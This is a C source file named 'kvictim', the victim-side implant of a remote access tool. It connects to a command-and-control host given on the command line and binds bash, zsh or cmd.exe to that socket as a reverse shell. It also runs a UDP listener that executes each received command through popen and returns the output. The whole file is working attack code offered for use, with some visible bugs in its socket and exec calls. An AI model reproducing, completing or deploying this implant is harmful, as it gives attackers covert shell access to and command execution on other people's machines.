// Copyright (c) 2026 Kloveme
// SPDX-License-Identifier: MIT
#include <netinet/in.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <arpa/inet.h>

#define socket_t int

struct victim_sock_data {
    socket_t VICTIM_SOCK;
    socket_t UDP_SOCK;
    char* c2_IP;
    int c2_PORT;
    int udp_PORT;
    struct sockaddr_in udp_sock_addr;
    struct sockaddr_in sock_addr;
};

void* listen_udp(void* arg){
    int udp_sock = *(socket_t*)arg;
    char c2_command_data[4096];
    char command_result[5000];
    struct sockaddr_in from_addr;
    socklen_t from_addr_len = sizeof(from_addr);
    FILE* new_fp;

    while (1) {
        memset(c2_command_data, 0, sizeof(c2_command_data));
        int accept_command_bytes = recvfrom(udp_sock,c2_command_data, 0, sizeof(c2_command_data) - 1,
             (struct sockaddr*)&from_addr, &from_addr_len);
             if (accept_command_bytes > 0) { 
                c2_command_data[strcspn(c2_command_data, "\n")] = '\0';
                new_fp = popen(c2_command_data, "r");

                if (new_fp)
                {
                    memset(command_result, 0, sizeof(command_result));
                    fread(command_result, 1, sizeof(command_result) - 1, new_fp);
                    pclose(new_fp);
                }else {return NULL;}
                sendto(udp_sock, 
                    command_result, strlen(command_result), 0,
                     (struct sockaddr*)&from_addr, from_addr_len);
             }
    }
    return NULL;
}

void print_use_method() {
    printf("kvictim <Host> <Port>  <UDP Port>");
}

int udp_connection_to_c2(struct victim_sock_data* vsd_) {
    vsd_->UDP_SOCK = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (vsd_->UDP_SOCK < 0)
    {return -1;}

    struct sockaddr_in udp_sock_addr_;
    udp_sock_addr_.sin_family = AF_INET;
    udp_sock_addr_.sin_port = htons(vsd_->udp_PORT);
    udp_sock_addr_.sin_addr.s_addr = INADDR_ANY;
    vsd_->udp_sock_addr = udp_sock_addr_;

    if (bind(vsd_->UDP_SOCK, (struct sockaddr*)&vsd_->udp_sock_addr,
         sizeof(vsd_->udp_sock_addr)) < 0) {
            return -1;
         }
         pthread_t tid;
         pthread_create(&tid, NULL,  listen_udp,
             &vsd_->UDP_SOCK);
            #ifdef _WIN32
                STARTUPINFO si = {0};
                PROCESS_INFORMATION pi = {0};
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESTDHANDLES;
                si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
                char* command_shell = "C:\\Windows\\System32\\cmd.exe";
                CreateProcess(NULL, command_shell, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
                WaitForSingleObject(pi.hProcess, INFINITE);
            #endif
            #ifdef __gnu_linux__
                dup2(vsd_->VICTIM_SOCK, 0);
                dup2(vsd_->VICTIM_SOCK, 1);
                dup2(vsd_->VICTIM_SOCK,2);
                char* command_shell = "/usr/bin/bash";
            #endif
            #ifdef __APPLE__
                dup2(vsd_->VICTIM_SOCK, 0);
                dup2(vsd_->VICTIM_SOCK, 1);
                dup2(vsd_->VICTIM_SOCK, 2);
                char* command_shell = "/bin/zsh";
            #endif
            execve(command_shell, NULL, NULL);
        return 0;
}

int connection_to_c2 (struct victim_sock_data* vsd_) {
    socket_t victim_sock = vsd_->VICTIM_SOCK;
    char* c2_ip = vsd_->c2_IP;
    struct sockaddr_in victim_sock_addr = vsd_->sock_addr;

    int connection_retuned = connect(victim_sock, (struct sockaddr*)&victim_sock_addr,
         sizeof(victim_sock_addr));
         if (connection_retuned < 0)
         {return -1;}
        return 1;
}

int main (int argc, char* argv[]) {
    struct sockaddr_in victim_sock_addr;
    socket_t new_victim_sock;
    socket_t new_udp_sock;
    int udp_port;
    int connection_port;
    char* connection_host;

    if (argc != 4)
    {print_use_method();return -1;}

    udp_port = atoi(argv[3]);
    connection_port = atoi(argv[2]);
    connection_host = argv[1];

    new_victim_sock = socket(AF_INET,SOCK_STREAM, 0);
    if (new_victim_sock == 0){return -1;}
    victim_sock_addr.sin_family = AF_INET;

    victim_sock_addr.sin_port = htons(connection_port);
    victim_sock_addr.sin_addr.s_addr = INADDR_ANY;

    if (inet_pton(AF_INET , connection_host , 
        &victim_sock_addr.sin_addr) <= 0) {
        return -1;
    }
    
    struct victim_sock_data vsd;
    vsd.VICTIM_SOCK = new_victim_sock;
    vsd.c2_IP = connection_host;
    vsd.sock_addr = victim_sock_addr;
    vsd.c2_PORT = connection_port;
    int tcp_conect = connection_to_c2(&vsd);
    if (tcp_conect <= -1) {return -1;}
    return udp_connection_to_c2(&vsd);
}